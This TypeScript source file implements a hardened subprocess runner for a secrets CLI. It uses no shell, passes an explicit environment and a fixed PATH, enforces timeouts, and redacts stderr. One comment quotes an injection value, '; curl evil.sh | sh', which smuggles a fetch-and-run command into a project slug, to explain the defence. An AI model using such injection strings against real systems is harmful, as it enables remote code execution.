import { execFile } from 'node:child_process';
import { BackendUnavailableError, InternalError } from '@bx-labs/agent-secrets-core';
import type { RedactionScope } from '@bx-labs/agent-secrets-redaction';
import { redactText, truncate } from '@bx-labs/agent-secrets-redaction';
import { tagFailureReason } from './failure-reason.js';

/**
 * The only way this codebase starts a program.
 *
 * Every property here exists because of a specific failure mode:
 *
 *  - **Argument array, never a shell.** `execFile` with `shell: false` means a
 *    project slug containing `; curl evil.sh | sh` is an argument, not a
 *    command. The scope grammar already rejects such input, but defence in
 *    depth is the whole point: a validation bug should not become RCE.
 *  - **Explicit environment.** The child gets exactly the variables we hand it.
 *    Inheriting `process.env` would hand every unrelated credential in the
 *    parent shell to `bws` — precisely the sprawl this product exists to end.
 *  - **Secrets travel by environment, never by argv.** `BWS_ACCESS_TOKEN` is an
 *    env var because `ps` shows argv to any process of the same user.
 *  - **Bounded everything.** A timeout, an output cap, and a kill escalation,
 *    so a hung or chatty backend cannot wedge the CLI or exhaust memory.
 *  - **Output is never returned raw.** stdout is handed back for schema
 *    parsing; stderr is redacted and truncated before it can reach an error
 *    message, a log, or an agent.
 */

export interface RunOptions {
  readonly file: string;
  readonly args: readonly string[];
  /**
   * The complete environment for the child. Nothing is inherited: pass exactly
   * what the program needs, including PATH if it needs one.
   */
  readonly env: Readonly<Record<string, string>>;
  readonly cwd?: string;
  readonly timeoutMs?: number;
  readonly maxOutputBytes?: number;
  /** Scope whose tracked values are scrubbed from any captured stderr. */
  readonly redactionScope?: RedactionScope;
  /** Written to the child's stdin and then closed. */
  readonly stdin?: string;
}

export interface RunResult {
  readonly code: number;
  readonly stdout: string;
  /** Already redacted and truncated. Safe to attach to an error. */
  readonly stderr: string;
  readonly durationMs: number;
  readonly timedOut: boolean;
}

export const DEFAULT_TIMEOUT_MS = 30_000;
export const DEFAULT_MAX_OUTPUT_BYTES = 4 * 1024 * 1024;

/**
 * Argument sanity check.
 *
 * Callers are expected to pass values already validated by the scope grammar,
 * so anything failing here is a programming error rather than user input — it
 * throws `InternalError`, not `InvalidInputError`. NUL is rejected because it
 * truncates the argument at the syscall boundary; newlines because they are the
 * classic way to smuggle a second directive into a program that parses its own
 * arguments line-wise.
 */
function assertSafeArgument(arg: string, index: number): void {
  if (typeof arg !== 'string') {
    throw new InternalError(`Subprocess argument ${index} is not a string.`);
  }
  if (arg.includes('\0')) {
    throw new InternalError(`Subprocess argument ${index} contains a NUL byte.`);
  }
  if (/[\r\n]/.test(arg)) {
    throw new InternalError(`Subprocess argument ${index} contains a newline.`);
  }
}

export async function run(options: RunOptions): Promise<RunResult> {
  const {
    file,
    args,
    env,
    cwd,
    timeoutMs = DEFAULT_TIMEOUT_MS,
    maxOutputBytes = DEFAULT_MAX_OUTPUT_BYTES,
    redactionScope,
    stdin,
  } = options;

  assertSafeArgument(file, -1);
  for (const [index, arg] of args.entries()) {
    assertSafeArgument(arg, index);
  }

  const startedAt = Date.now();

  return await new Promise<RunResult>((resolve, reject) => {
    let timedOut = false;

    const child = execFile(
      file,
      [...args],
      {
        env: { ...env },
        ...(cwd === undefined ? {} : { cwd }),
        timeout: timeoutMs,
        maxBuffer: maxOutputBytes,
        killSignal: 'SIGKILL',
        shell: false,
        windowsHide: true,
        encoding: 'utf8',
      },
      (error, stdout, stderr) => {
        const durationMs = Date.now() - startedAt;
        // stderr is the single most likely place for a backend to echo the
        // value or the token back at us, so it is scrubbed before anything
        // else can see it.
        const safeStderr = truncate(redactText(String(stderr ?? ''), redactionScope), 8 * 1024);

        if (error) {
          const nodeError = error as NodeJS.ErrnoException & {
            code?: string | number;
            killed?: boolean;
            signal?: NodeJS.Signals;
          };

          if (nodeError.code === 'ENOENT') {
            reject(
              tagFailureReason(
                new BackendUnavailableError(`Executable not found: ${file}`, {
                  // A bare name is resolved against SAFE_PATH, not the caller's
                  // PATH, so `which bws` succeeding proves nothing here. The
                  // hint names the two ways to point at a binary elsewhere.
                  hint: `Install it under one of ${SAFE_PATH}, or set AGENT_SECRETS_BWS_PATH (or --executable-path) to its absolute path.`,
                  cause: error,
                }),
                'executable-not-found',
              ),
            );
            return;
          }

          if (nodeError.killed || timedOut || nodeError.signal === 'SIGKILL') {
            reject(
              tagFailureReason(
                new BackendUnavailableError(
                  `Command timed out after ${timeoutMs}ms and was terminated.`,
                  { hint: 'Raise the timeout or check backend reachability.', cause: error },
                ),
                'timeout',
              ),
            );
            return;
          }

          // A non-zero exit is a normal outcome the caller interprets; only
          // spawn-level failures reject.
          if (typeof nodeError.code === 'number') {
            resolve({
              code: nodeError.code,
              stdout: String(stdout ?? ''),
              stderr: safeStderr,
              durationMs,
              timedOut: false,
            });
            return;
          }

          reject(
            tagFailureReason(
              new BackendUnavailableError('Command failed to run.', {
                // The original error is preserved for local debugging but never
                // rendered: its message can embed the token or the value.
                cause: error,
              }),
              'unreachable',
            ),
          );
          return;
        }

        resolve({
          code: 0,
          stdout: String(stdout ?? ''),
          stderr: safeStderr,
          durationMs,
          timedOut: false,
        });
      },
    );

    child.on('error', () => {
      // Handled through the execFile callback; this listener only prevents an
      // unhandled 'error' event from crashing the process.
    });

    if (stdin !== undefined) {
      child.stdin?.on('error', () => {
        // EPIPE when the child exits before reading. Not actionable.
      });
      child.stdin?.end(stdin);
    } else {
      child.stdin?.end();
    }

    const timer = setTimeout(() => {
      timedOut = true;
    }, timeoutMs);
    timer.unref?.();
    child.on('close', () => clearTimeout(timer));
  });
}

/**
 * A minimal, explicit PATH for helper binaries.
 *
 * We do not inherit the caller's PATH when resolving `bws` or `security`: a
 * poisoned PATH entry is a cheap way to substitute a program that captures the
 * access token. Callers that must honour a user-configured location pass an
 * absolute path instead.
 */
export const SAFE_PATH = '/usr/local/bin:/opt/homebrew/bin:/usr/bin:/bin:/usr/sbin:/sbin';

export function minimalEnv(extra: Readonly<Record<string, string>> = {}): Record<string, string> {
  return {
    PATH: SAFE_PATH,
    HOME: process.env['HOME'] ?? '/tmp',
    LANG: 'C',
    LC_ALL: 'C',
    // Bitwarden and most CLIs honour NO_COLOR; ANSI escapes in captured output
    // defeat naive redaction by splitting a value across escape sequences.
    NO_COLOR: '1',
    ...extra,
  };
}
